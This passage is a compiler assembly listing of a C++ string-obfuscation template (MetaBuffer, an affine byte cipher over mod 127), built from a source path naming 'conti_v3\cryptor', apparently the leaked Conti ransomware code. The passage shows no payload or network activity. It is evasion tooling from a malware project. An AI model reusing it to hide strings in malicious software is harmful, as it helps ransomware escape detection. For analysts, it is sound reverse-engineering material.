; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv133 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00107	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0010b	88 85 c0 00 00
	00		 mov	 BYTE PTR tv133[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00111	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00118	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0011f	5f		 pop	 rdi
  00120	5d		 pop	 rbp
  00121	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 2c	 sub	 eax, 44			; 0000002cH
  0002d	6b c0 d9	 imul	 eax, eax, -39		; ffffffffffffffd9H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 0d	 imul	 eax, eax, 13
  0002d	83 c0 2c	 add	 eax, 44			; 0000002cH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 04	 cmp	 QWORD PTR i$1[rbp], 4
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv94 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000dd	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  000e1	88 85 c0 00 00
	00		 mov	 BYTE PTR tv94[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  000e7	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000ee	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  000f5	5f		 pop	 rdi
  000f6	5d		 pop	 rbp
  000f7	c3		 ret	 0
??0?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 15	 sub	 eax, 21
  0002d	6b c0 33	 imul	 eax, eax, 51		; 00000033H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
